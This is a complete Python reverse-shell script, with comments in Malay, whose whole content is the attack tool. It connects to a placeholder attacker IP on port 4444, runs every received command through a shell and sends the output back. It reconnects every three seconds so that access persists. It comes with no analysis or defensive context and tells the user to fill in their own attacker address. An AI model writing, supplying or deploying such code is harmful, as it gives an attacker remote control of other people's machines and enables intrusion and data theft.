#!/usr/bin/env python3
import socket
import subprocess
import os
import sys

def main():
    # Ganti dengan IP dan PORT attacker
    ATTACKER_IP = '192.168.1.100'   # <<< GANTI NI
    ATTACKER_PORT = 4444             # <<< GANTI NI
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            while True:
                data = s.recv(1024).decode()
                if not data or data.strip() == 'exit':
                    break
                
                # Execute command
                if data.strip():
                    process = subprocess.Popen(
                        data.strip(),
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE
                    )
                    stdout, stderr = process.communicate()
                    
                    result = stdout + stderr
                    if not result:
                        result = b"[+] Command executed (no output)\n"
                    
                    s.send(result)
                    
        except (socket.error, ConnectionRefusedError, ConnectionResetError):
            # Retry connection setiap 3 saat
            import time
            time.sleep(3)
            continue
        except KeyboardInterrupt:
            sys.exit(0)

if __name__ == "__main__":
    main()
